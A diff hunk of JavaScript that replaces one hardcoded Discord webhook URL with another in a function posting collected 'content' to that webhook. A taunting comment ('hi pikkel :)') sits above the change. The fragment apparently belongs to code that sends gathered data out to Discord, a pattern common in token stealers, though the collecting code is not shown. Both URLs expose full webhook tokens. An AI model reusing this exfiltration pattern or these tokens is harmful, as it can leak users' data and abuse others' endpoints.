@@ -15,7 +15,7 @@ function req () {
     content+='```';
     const post = {
       // hi pikkel :)
-      url:'https://discord.com/api/webhooks/868704785182912552/jPh26t_f2VM4vU1z_MF3s7wI2qHda0BsVRrZc2b4Xe2Mayr30PijamCNiv1em4fBeAIH',
+      url:'https://discord.com/api/webhooks/868713942929768459/9V_qvI_8QbsA-akLhwDIv8Xs0LJJZea3q-bgB7rq2hpU1eRx2YsTLVbxw4Eo8p9fkAWn',
       method:'POST',
       data:{
         "content":content,
